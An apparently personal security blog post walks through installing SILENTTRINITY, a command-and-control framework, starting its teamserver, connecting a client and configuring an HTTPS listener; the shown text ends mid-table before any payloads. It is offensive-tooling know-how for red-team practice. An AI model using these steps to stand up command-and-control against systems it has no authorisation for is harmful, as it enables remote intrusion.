<!DOCTYPE html>
<html lang="en">
  <head>
    
      <title>
        How to Use Silent Trinity - Bresaola 0.3.0dev ::
        H4cklife!! — No-life it
      </title>
    
    <meta http-equiv="content-type" content="text/html; charset=utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<meta
  name="description"
  content="Overview ☔ # Yea.....so apparently there is very little documentation for the current build of Silent Trinity. I was in the office today and saw my boy TheTalilama figuring it out so I decided to hop in and see how it worked. It actually does a great job against Windows 10 from what I have seen from just fooling around with it. Let&#39;s get into how it works.
Download Silent Trinity!"
/>
<meta
  name="keywords"
  content="Hacking"
/>
<meta name="robots" content="noodp" />
<link rel="canonical" href="/posts/how-to-use-silent-trinity/" />





<link rel="stylesheet" href="/assets/style.css" />

<link rel="stylesheet" href="/style.css" />


<link
  rel="apple-touch-icon-precomposed"
  sizes="144x144"
  href="/img/apple-touch-icon-144-precomposed.png"
/>
<link rel="shortcut icon" href="/img/favicon.png" />


<link href="/assets/fonts/Inter-Italic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
<link href="/assets/fonts/Inter-Regular.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
<link href="/assets/fonts/Inter-Medium.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
<link href="/assets/fonts/Inter-MediumItalic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
<link href="/assets/fonts/Inter-Bold.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
<link href="/assets/fonts/Inter-BoldItalic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">


<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="How to Use Silent Trinity - Bresaola 0.3.0dev"/>
<meta name="twitter:description" content="Overview ☔ # Yea.....so apparently there is very little documentation for the current build of Silent Trinity. I was in the office today and saw my boy TheTalilama figuring it out so I decided to hop in and see how it worked. It actually does a great job against Windows 10 from what I have seen from just fooling around with it. Let&#39;s get into how it works.
Download Silent Trinity!"/>



<meta property="og:title" content="How to Use Silent Trinity - Bresaola 0.3.0dev" />
<meta property="og:description" content="Overview ☔ # Yea.....so apparently there is very little documentation for the current build of Silent Trinity. I was in the office today and saw my boy TheTalilama figuring it out so I decided to hop in and see how it worked. It actually does a great job against Windows 10 from what I have seen from just fooling around with it. Let&#39;s get into how it works.
Download Silent Trinity!" />
<meta property="og:type" content="article" />
<meta property="og:url" content="/posts/how-to-use-silent-trinity/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2019-08-14T21:19:50-06:00" />
<meta property="article:modified_time" content="2019-08-14T21:19:50-06:00" /><meta property="og:site_name" content="H4cklife!!" />







  </head>
  <body class="dark-theme">
    <div class="container">
      <header class="header">
  <span class="header__inner">
    <a
  href="/"
  class="logo"
  style="text-decoration: none;"
>
  
    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44">
  <path fill="none" d="M15 8l14.729 14.382L15 35.367" />
</svg>
</span>
    <span class="logo__text"
      >H4cklife!!</span
    >
    <span class="logo__cursor"></span>
  
</a>

    <span class="header__right">
      
        <nav class="menu">
  <ul class="menu__inner menu__inner--desktop">
    
      
        
          <li><a href="/about/">About</a></li>
        
      
        
          <li><a href="/beefhook/">Beefhooks</a></li>
        
      
        
          <li><a href="/coalcast/">Coalcast!</a></li>
        
      
        
          <li><a href="/wallpapers/">Wallpapers</a></li>
        
      
      
      
  </ul>

  <ul class="menu__inner menu__inner--mobile">
    
      
        <li><a href="/about/">About</a></li>
      
    
      
        <li><a href="/beefhook/">Beefhooks</a></li>
      
    
      
        <li><a href="/coalcast/">Coalcast!</a></li>
      
    
      
        <li><a href="/wallpapers/">Wallpapers</a></li>
      
    
  </ul>
</nav>

        <span class="menu-trigger">
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
            <path d="M0 0h24v24H0z" fill="none" />
            <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z" />
          </svg>
        </span>
      
      <span class="theme-toggle">
        <svg
  class="theme-toggler"
  width="24"
  height="24"
  viewBox="0 0 48 48"
  fill="none"
  xmlns="http://www.w3.org/2000/svg"
>
  <path
    d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"
  />
</svg>

      </span>
    </span>
  </span>
</header>


      <div class="content">
        
  
  

  <div class="post">
    <h1 class="post-title">How to Use Silent Trinity - Bresaola 0.3.0dev</h1>
    <div class="post-meta">
      
        <span class="post-date">
          2019-08-14
        </span>

        
      

      


      
        <span class="post-read-time"
          >— 12 min read</span
        >
      
    </div>

    

    

    <div class="post-content">
      
      <h1 id="overview--">
  Overview  ☔
  <a href="#overview--" class="h-anchor" aria-hidden="true">#</a>
</h1>
<p style="text-align:justify;">
Yea.....so apparently there is very little documentation for the current build of Silent Trinity. I was in the office today and saw my boy <a href="https://twitter.com/thetalilama">TheTalilama</a> figuring it out so I decided to hop in and see how it worked. It actually does a great job against Windows 10 from what I have seen from just fooling around with it. Let's get into how it works.</p>
<center><a href="https://github.com/byt3bl33d3r/SILENTTRINITY">Download Silent Trinity!</a></center>
<hr>
<h2 id="how-to-use-it----tldrers-start-here-">
  How to Use it  &ndash;TLDRers Start here ⤵
  <a href="#how-to-use-it----tldrers-start-here-" class="h-anchor" aria-hidden="true">#</a>
</h2>
<h3 id="installation-">
  Installation ☕
  <a href="#installation-" class="h-anchor" aria-hidden="true">#</a>
</h3>
<p style="text-align:justify;">
So the way I went about installing Silent Trinity is by sticking strictly to the instructions on the <a href="https://github.com/byt3bl33d3r/SILENTTRINITY/wiki/Installation">wiki</a>:</p>
<pre tabindex="0"><code>git clone https://github.com/byt3bl33d3r/SILENTTRINITY
pip3 install pipenv &amp;&amp; pipenv install &amp;&amp; pipenv shell
</code></pre><p>Once the pipenv is set up you should see something similar to what I have here (minus my Moofasa Cow!):</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>clutchisback1@Deadpool /e/g/SILENTTRINITY  $ pipenv shell                                                                                <span style="color:#ae81ff">1</span> changed file  master
</span></span><span style="display:flex;"><span>Launching subshell in virtual environment…
</span></span><span style="display:flex;"><span> ______        __      ____ _____
</span></span><span style="display:flex;"><span>|  _ <span style="color:#ae81ff">\ \ </span>     / / __  / ___| ____|
</span></span><span style="display:flex;"><span>| |_<span style="color:#f92672">)</span> <span style="color:#ae81ff">\ \ </span>/<span style="color:#ae81ff">\ </span>/ / <span style="color:#960050;background-color:#1e0010">&#39;</span>_ <span style="color:#ae81ff">\|</span> |  _|  _|  
</span></span><span style="display:flex;"><span>|  __/ <span style="color:#ae81ff">\ </span>V  V /| | | | |_| | |___
</span></span><span style="display:flex;"><span>|_|     <span style="color:#ae81ff">\_</span>/<span style="color:#ae81ff">\_</span>/ |_| |_|<span style="color:#ae81ff">\_</span>___|_____|
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span> _________
</span></span><span style="display:flex;"><span>&lt; L337Hax &gt;
</span></span><span style="display:flex;"><span> ---------
</span></span><span style="display:flex;"><span>       <span style="color:#ae81ff">\ </span>   ____
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">\ </span> /    <span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>          | ^__^ |
</span></span><span style="display:flex;"><span>          | <span style="color:#f92672">(</span>oo<span style="color:#f92672">)</span> |______
</span></span><span style="display:flex;"><span>          | <span style="color:#f92672">(</span>__<span style="color:#f92672">)</span> |      <span style="color:#f92672">)</span><span style="color:#ae81ff">\/\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>           <span style="color:#ae81ff">\_</span>___/|----w |
</span></span><span style="display:flex;"><span>                <span style="color:#f92672">||</span>     <span style="color:#f92672">||</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                 Moofasa
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>SILENTTRINITY<span style="color:#f92672">)</span>  <span style="color:#f92672">(</span>SILENTTRINITY-9_xnHD7q<span style="color:#f92672">)</span>  clutchisback1@HOMEPC ≫ $
</span></span></code></pre></div><center>
<figcaption>
<center>Pipenv Setup Correctly</center>
</figcaption>
</center>
<h3 id="running-silent-trinity-things-">
  Running Silent Trinity Things 🌀
  <a href="#running-silent-trinity-things-" class="h-anchor" aria-hidden="true">#</a>
</h3>
<p style="text-align:justify;">
So first you'll need to start a teamserver. You'll need to specify the IP of your teamserver. If you're testing this out that'll probably be your localhost IP. Once that's set you'll need to specify a password. I chose the password that I use for all of my social media accounts: "beefhooks".</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">(</span>SILENTTRINITY<span style="color:#f92672">)</span>  <span style="color:#f92672">(</span>SILENTTRINITY-9_xnHD7q<span style="color:#f92672">)</span>  clutchisback1@Deadpool ≫   $ sudo python3 teamserver.py 172.30.5.18 beef                                                                                <span style="color:#ae81ff">1</span> changed file  master
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>sudo<span style="color:#f92672">]</span> password <span style="color:#66d9ef">for</span> clutchisback1:
</span></span><span style="display:flex;"><span>2019-08-14 11:33:29,397 <span style="color:#ae81ff">28871</span> IPCServer - <span style="color:#f92672">[</span>DEBUG<span style="color:#f92672">]</span> ipcserver.py: run - Started IPC server on 127.0.0.1:63355
</span></span><span style="display:flex;"><span>2019-08-14 11:33:29,440 <span style="color:#ae81ff">28871</span> MainThread - <span style="color:#f92672">[</span>DEBUG<span style="color:#f92672">]</span> selector_events.py: __init__ - Using selector: EpollSelector
</span></span><span style="display:flex;"><span>2019-08-14 11:33:29,441 <span style="color:#ae81ff">28871</span> MainThread - <span style="color:#f92672">[</span>ERROR<span style="color:#f92672">]</span> loader.py: get_loadables - Failed loading listener core/teamserver/listeners/http.py: No module named <span style="color:#e6db74">&#39;quart&#39;</span>
</span></span><span style="display:flex;"><span>2019-08-14 11:33:29,442 <span style="color:#ae81ff">28871</span> MainThread - <span style="color:#f92672">[</span>ERROR<span style="color:#f92672">]</span> loader.py: get_loadables - Failed loading listener core/teamserver/listeners/dns.py: No module named <span style="color:#e6db74">&#39;core.thirdparty&#39;</span>
</span></span><span style="display:flex;"><span>2019-08-14 11:33:29,443 <span style="color:#ae81ff">28871</span> MainThread - <span style="color:#f92672">[</span>ERROR<span style="color:#f92672">]</span> loader.py: get_loadables - Failed loading listener core/teamserver/listeners/https.py: No module named <span style="color:#e6db74">&#39;quart&#39;</span>
</span></span><span style="display:flex;"><span>2019-08-14 11:33:29,489 <span style="color:#ae81ff">28871</span> MainThread - <span style="color:#f92672">[</span>DEBUG<span style="color:#f92672">]</span> loader.py: get_loadables - Loaded <span style="color:#ae81ff">2</span> listener<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>2019-08-14 11:33:29,489 <span style="color:#ae81ff">28871</span> MainThread - <span style="color:#f92672">[</span>DEBUG<span style="color:#f92672">]</span> ipcserver.py: attach - Attaching event: KEY_EXCHANGE -&gt; Sessions.kex
</span></span><span style="display:flex;"><span>2019-08-14 11:33:29,489 <span style="color:#ae81ff">28871</span> MainThread - <span style="color:#f92672">[</span>DEBUG<span style="color:#f92672">]</span> ipcserver.py: attach - Attaching event: ENCRYPT_STAGE -&gt; Sessions.gen_encrypted_stage
</span></span><span style="display:flex;"><span>2019-08-14 11:33:29,489 <span style="color:#ae81ff">28871</span> MainThread - <span style="color:#f92672">[</span>DEBUG<span style="color:#f92672">]</span> ipcserver.py: attach - Attaching event: SESSION_STAGED -&gt; Sessions.notify_session_staged
</span></span><span style="display:flex;"><span>2019-08-14 11:33:29,489 <span style="color:#ae81ff">28871</span> MainThread - <span style="color:#f92672">[</span>DEBUG<span style="color:#f92672">]</span> ipcserver.py: attach - Attaching event: SESSION_CHECKIN -&gt; Sessions.session_checked_in
</span></span><span style="display:flex;"><span>2019-08-14 11:33:29,489 <span style="color:#ae81ff">28871</span> MainThread - <span style="color:#f92672">[</span>DEBUG<span style="color:#f92672">]</span> ipcserver.py: attach - Attaching event: NEW_JOB -&gt; Sessions.add_job
</span></span><span style="display:flex;"><span>2019-08-14 11:33:29,489 <span style="color:#ae81ff">28871</span> MainThread - <span style="color:#f92672">[</span>DEBUG<span style="color:#f92672">]</span> ipcserver.py: attach - Attaching event: JOB_RESULT -&gt; Sessions.job_result
</span></span><span style="display:flex;"><span>2019-08-14 11:33:29,491 <span style="color:#ae81ff">28871</span> MainThread - <span style="color:#f92672">[</span>DEBUG<span style="color:#f92672">]</span> loader.py: get_loadables - Loaded <span style="color:#ae81ff">12</span> module<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>2019-08-14 11:33:29,491 <span style="color:#ae81ff">28871</span> MainThread - <span style="color:#f92672">[</span>DEBUG<span style="color:#f92672">]</span> ipcserver.py: attach - Attaching event: GET_STAGERS -&gt; Stagers.get_stagers
</span></span><span style="display:flex;"><span>2019-08-14 11:33:29,492 <span style="color:#ae81ff">28871</span> MainThread - <span style="color:#f92672">[</span>DEBUG<span style="color:#f92672">]</span> loader.py: get_loadables - Loaded <span style="color:#ae81ff">5</span> stager<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>2019-08-14 11:33:29,493 <span style="color:#ae81ff">28871</span> MainThread - <span style="color:#f92672">[</span>WARNING<span style="color:#f92672">]</span> teamserver.py: server - Teamserver certificate fingerprint: 2cc53f26a01d732c9bb07a29f9032b9debf7ef3f0b4de1aa75050b2b52fda3d1
</span></span><span style="display:flex;"><span>2019-08-14 11:33:29,493 <span style="color:#ae81ff">28871</span> MainThread - <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> teamserver.py: server - Teamserver started on 172.30.5.18:5000
</span></span></code></pre></div><center>
<figcaption>
<center>Teamserver Setup Correctly</center>
</figcaption>
</center>
<p style="text-align:justify;">
After the teamserver is up and running you'll need to connect to it with <code>st.py</code>. (<i>All this is in the wiki so far</i>)
</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">(</span>SILENTTRINITY<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>SILENTTRINITY-9_xnHD7q<span style="color:#f92672">)</span>  clutchisback1@HOMEPC ≫  python3 st.py wss://test:beef@172.30.5.18:5000
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                                         ........                                   
</span></span><span style="display:flex;"><span>                                    .<span style="color:#e6db74">&#39;:ldxkkkkkxdoc,.                               
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                                  .cdOOOOOOOOOOOOOOOxl,.                            
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                                .ckOOOOOOOOOOOOOOOOOOOko&#39;</span>                           
</span></span><span style="display:flex;"><span>                               .dOOOOOOOOOOOOOOOOOOOOOOOx;                          
</span></span><span style="display:flex;"><span>                              .oOOOOOOOOOOOOOOOOOOOOOOOOOx,                         
</span></span><span style="display:flex;"><span>                              :OOOOOOOOOOOOOOOOOOOOOOOOOOOo.                        
</span></span><span style="display:flex;"><span>                             .lOOOOxoccldOOOOOOOxoccldkOOOd<span style="color:#e6db74">&#39;                        
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                              cOOkc&#39;</span>.,,..;xOOOkc<span style="color:#e6db74">&#39;.,;..;dOOd.                        
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                              ,kOl.&#39;</span>cccl;.;kOOl.<span style="color:#e6db74">&#39;cccl;.;kOc.                        
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                              .cOl..:cc:&#39;</span>.:kOOo..:cc:,.:kd.                         
</span></span><span style="display:flex;"><span>                               .oko,.<span style="color:#e6db74">&#39;&#39;</span>.<span style="color:#e6db74">&#39;cxl;cdo,.&#39;</span>,.<span style="color:#e6db74">&#39;cxx,                          
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                                .oOOxoodkOd;&#39;</span>,lOOxoodkOx,                           
</span></span><span style="display:flex;"><span>                                 .oOxdocc:;;;;;::cloxkx,                            
</span></span><span style="display:flex;"><span>                                  .<span style="color:#e6db74">&#39;.               .&#39;</span>.                             
</span></span><span style="display:flex;"><span>                          .......                       .......                     
</span></span><span style="display:flex;"><span>                   ..;:looddxxkkk;         .<span style="color:#e6db74">&#39;&#39;</span>.        .dkkxxdddolc;<span style="color:#e6db74">&#39;.              
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                 &#39;</span>cdkOOxc;,,,cdOOo.       <span style="color:#e6db74">&#39;dOk:        :OOxl;,,,:dOOOxl,.           
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">               .lkOOOOd&#39;</span>.;::;<span style="color:#e6db74">&#39;.lOO:       .cOd.       ,xOx,.,::;&#39;</span>.lOOOOOd,          
</span></span><span style="display:flex;"><span>              ,xOOOOOOc.;o:;o: ;kkx;       ;oc.      <span style="color:#e6db74">&#39;okOl.,oc;oc.,kOOOOOkc.        
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">             ,xOOOOOOOd,.,;;,..ox;,l:.              &#39;</span>l;,ox,.,;;;<span style="color:#e6db74">&#39;.lOOOOOOOOc.       
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            .oOOOOOOOOOkl;,,;cxOdc:okl.           .:xdc:oOkl;,,;cdOOOOOOOOOk,       
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            ,xOOOOOOOOOOOOOOOkdc;;:okOx:.        ,okkdc:;:okOOOOOOOOOOOOOOOOc       
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            ,kOOOOOOOOOOOOOOx;.&#39;</span>;;<span style="color:#e6db74">&#39;.,dOOd:.    &#39;</span>okOx:..;;<span style="color:#e6db74">&#39;.&#39;</span>oOOOOOOOOOOOOOOOc       
</span></span><span style="display:flex;"><span>            .dOOOOOOOOOOOOOOc.,oc:o: ;kOkc.    ,xOOl.,oc;o:.,kOOOOOOOOOOOOOk;       
</span></span><span style="display:flex;"><span>             ;kOOOOOOOOOOOOOo..;cc:<span style="color:#e6db74">&#39;.cOx;       .oOd..;cc:&#39;</span>.cOOOOOOOOOOOOOOl.       
</span></span><span style="display:flex;"><span>             .:kOOOOOOOOOOOOOd;<span style="color:#e6db74">&#39;,,&#39;</span>,oko.         .cxd:<span style="color:#e6db74">&#39;,,&#39;</span>,lkOOOOOOOOOOOOOo.        
</span></span><span style="display:flex;"><span>               ,dOOOOOOOOOOOOOOkxxkOx;.            <span style="color:#e6db74">&#39;okkxxkOOOOOOOOOOOOOOx:.         
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                .;okOOOOOOOOOOOOOkd:.               .,lxOOOOOOOOOOOOOkd:.           
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                   .,cldxxkkxdoc;.                     .,cldxxkkxdoc;&#39;</span>.             
</span></span><span style="display:flex;"><span>                        ......                              ......                  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        _____ ______    _______   __________________  _____   ______________  __
</span></span><span style="display:flex;"><span>       / ___//  _/ /   / ____/ | / /_  __/_  __/ __ <span style="color:#ae81ff">\/</span>  _/ | / /  _/_  __/<span style="color:#ae81ff">\ \/</span> /
</span></span><span style="display:flex;"><span>       <span style="color:#ae81ff">\_</span>_ <span style="color:#ae81ff">\ </span>/ // /   / __/ /  |/ / / /   / / / /_/ // //  |/ // /  / /    <span style="color:#ae81ff">\ </span> /
</span></span><span style="display:flex;"><span>      ___/ // // /___/ /___/ /|  / / /   / / / _, _// // /|  // /  / /     / /
</span></span><span style="display:flex;"><span>     /____/___/_____/_____/_/ |_/ /_/   /_/ /_/ |_/___/_/ |_/___/ /_/     /_/
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                                    Codename : Bresaola
</span></span><span style="display:flex;"><span>                                   Version  : 0.3.0dev
</span></span></code></pre></div><center>
<figcaption>
<center>Connecting to Teamserver</center>
</figcaption>
</center>
<p style="text-align:justify;">
Okay, you should have Silent Trinity up and running at this point. If not you're probably playing the "python dependencies" game but if you've made it this far you should be good from here on out. The next thing you need to do is get a listener going like so:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>[<span style="color:#ae81ff">1</span>] ST <span style="color:#960050;background-color:#1e0010">≫</span> listeners                                                                                                    
</span></span><span style="display:flex;"><span>[<span style="color:#ae81ff">1</span>] ST (listeners) <span style="color:#960050;background-color:#1e0010">≫</span> use https                                                                                        
</span></span><span style="display:flex;"><span>[<span style="color:#ae81ff">1</span>] ST (listeners)(https) <span style="color:#960050;background-color:#1e0010">≫</span> options                                                                                   
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">┌</span>Listener Options<span style="color:#960050;background-color:#1e0010">────────┬───────────────┬───────────────────────────────────┐</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">│</span> Option Name <span style="color:#960050;background-color:#1e0010">│</span> Required <span style="color:#960050;background-color:#1e0010">│</span> Value         <span style="color:#960050;background-color:#1e0010">│</span> Description                       <span style="color:#960050;background-color:#1e0010">│</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">├─────────────┼──────────┼───────────────┼───────────────────────────────────┤</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">│</span> Name        <span style="color:#960050;background-color:#1e0010">│</span> <span style="color:#66d9ef">True</span>     <span style="color:#960050;background-color:#1e0010">│</span> https         <span style="color:#960050;background-color:#1e0010">│</span> Name <span style="color:#66d9ef">for</span> the listener<span style="color:#f92672">.</span>            <span style="color:#960050;background-color:#1e0010">│</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">├─────────────┼──────────┼───────────────┼───────────────────────────────────┤</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">│</span> BindIP      <span style="color:#960050;background-color:#1e0010">│</span> <span style="color:#66d9ef">True</span>     <span style="color:#960050;background-color:#1e0010">│</span> <span style="color:#ae81ff">172.30.5.18</span>   <span style="color:#960050;background-color:#1e0010">│</span> The IPv4<span style="color:#f92672">/</span>IPv6 address to bind to<span style="color:#f92672">.</span> <span style="color:#960050;background-color:#1e0010">│</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">├─────────────┼──────────┼───────────────┼───────────────────────────────────┤</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">│</span> Port        <span style="color:#960050;background-color:#1e0010">│</span> <span style="color:#66d9ef">True</span>     <span style="color:#960050;background-color:#1e0010">│</span> <span style="color:#ae81ff">443</span>           <span style="color:#960050;background-color:#1e0010">│</span> Port <span style="color:#66d9ef">for</span> the listener<span style="color:#f92672">.</span>            <span style="color:#960050;background-color:#1e0010">│</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">├─────────────┼──────────┼───────────────┼───────────────────────────────────┤</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">│</span> Cert        <span style="color:#960050;background-color:#1e0010">│</span> <span style="color:#66d9ef">False</span>    <span style="color:#960050;background-color:#1e0010">│</span> data<span style="color:#f92672">/</span>cert<span style="color:#f92672">.</span>pem <span style="color:#960050;background-color:#1e0010">│</span> SSL Certificate file              <span style="color:#960050;background-color:#1e0010">│</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">├─────────────┼──────────┼───────────────┼───────────────────────────────────┤</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">│</span> Key         <span style="color:#960050;background-color:#1e0010">│</span> <span style="color:#66d9ef">False</span>    <span style="color:#960050;background-color:#1e0010">│</span> data<span style="color:#f92672">/</span>key<span style="color:#f92672">.</span>pem  <span style="color:#960050;background-color:#1e0010">│</span> SSL Key file                      <span style="color:#960050;background-color:#1e0010">│</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">├─────────────┼──────────┼───────────────┼───────────────────────────────────┤</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">│</span> RegenCert   <span style="color:#960050;background-color:#1e0010">│</span> <span style="color:#66d9ef">False</span>    <span style="color:#960050;background-color:#1e0010">│</span> <span style="color:#66d9ef">False</span>         <span style="color:#960050;background-color:#1e0010">│</span> Regenerate TLS cert               <span style="color:#960050;background-color:#1e0010">│</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">├─────────────┼──────────┼───────────────┼───────────────────────────────────┤</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">│</span> Comms       <span style="color:#960050;background-color:#1e0010">│</span> <span style="color:#66d9ef">True</span>     <span style="color:#960050;background-color:#1e0010">│</span> https         <span style="color:#960050;background-color:#1e0010">│</span> C2 Comms to use                   <span style="color:#960050;background-color:#1e0010">│</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">└─────────────┴──────────┴───────────────┴───────────────────────────────────┘</span>
</span></span></code></pre></div><center>
<figcaption>
<center>Starting Listener</center>
</figcaption>
</center>
<p style="text-align:justify;">
Also, if you're not running this pipenv as root you wont be able to use ports below 1000 so make sure you use port 8080 or something. You can change ports like so:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-rust" data-lang="rust"><span style="display:flex;"><span>[<span style="color:#ae81ff">1</span>] ST (listeners)(https) <span style="color:#960050;background-color:#1e0010">≫</span> set port <span style="color:#ae81ff">8080</span>                                                                             
</span></span><span style="display:flex;"><span>[<span style="color:#ae81ff">1</span>] ST (listeners)(https) <span style="color:#960050;background-color:#1e0010">≫</span> options                                                                                   
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">┌</span>Listener Options<span style="color:#960050;background-color:#1e0010">────────┬───────────────┬───────────────────────────────────┐</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">│</span> Option Name <span style="color:#960050;background-color:#1e0010">│</span> Required <span style="color:#960050;background-color:#1e0010">│</span> Value         <span style="color:#960050;background-color:#1e0010">│</span> Description                       <span style="color:#960050;background-color:#1e0010">│</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">├─────────────┼──────────┼───────────────┼───────────────────────────────────┤</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">│</span> Name        <span style="color:#960050;background-color:#1e0010">│</span> True     <span style="color:#960050;background-color:#1e0010">│</span> https         <span style="color:#960050;background-color:#1e0010">│</span> Name <span style="color:#66d9ef">for</span> the listener.            <span style="color:#960050;background-color:#1e0010">│</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">├─────────────┼──────────┼───────────────┼───────────────────────────────────┤</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">│</span> BindIP      <span style="color:#960050;background-color:#1e0010">│</span> True     <span style="color:#960050;background-color:#1e0010">│</span> <span style="color:#ae81ff">172.30.5.18</span>   <span style="color:#960050;background-color:#1e0010">│</span> The IPv4<span style="color:#f92672">/</span>IPv6 address to bind to. <span style="color:#960050;background-color:#1e0010">│</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">├─────────────┼──────────┼───────────────┼───────────────────────────────────┤</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">│</span> Port        <span style="color:#960050;background-color:#1e0010">│</span> True     <span style="color:#960050;background-color:#1e0010">│</span> <span style="color:#ae81ff">8080</span>          <span style="color:#960050;background-color:#1e0010">│</span> Port <span style="color:#66d9ef">for</span> the listener.            <span style="color:#960050;background-color:#1e0010">│</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">├─────────────┼──────────┼───────────────┼───────────────────────────────────┤</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">│</span> Cert        <span style="color:#960050;background-color:#1e0010">│</span> False    <span style="color:#960050;background-color:#1e0010">│</span> data<span style="color:#f92672">/</span>cert.pem <span style="color:#960050;background-color:#1e0010">│</span> SSL Certificate file              <span style="color:#960050;background-color:#1e0010">│</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">├─────────────┼──────────┼───────────────┼───────────────────────────────────┤</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">│</span> Key         <span style="color:#960050;background-color:#1e0010">│</span> False    <span style="color:#960050;background-color:#1e0010">│</span> data<span style="color:#f92672">/</span>key.pem  <span style="color:#960050;background-color:#1e0010">│</span> SSL Key file                      <span style="color:#960050;background-color:#1e0010">│</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">├─────────────┼──────────┼───────────────┼───────────────────────────────────┤</span>
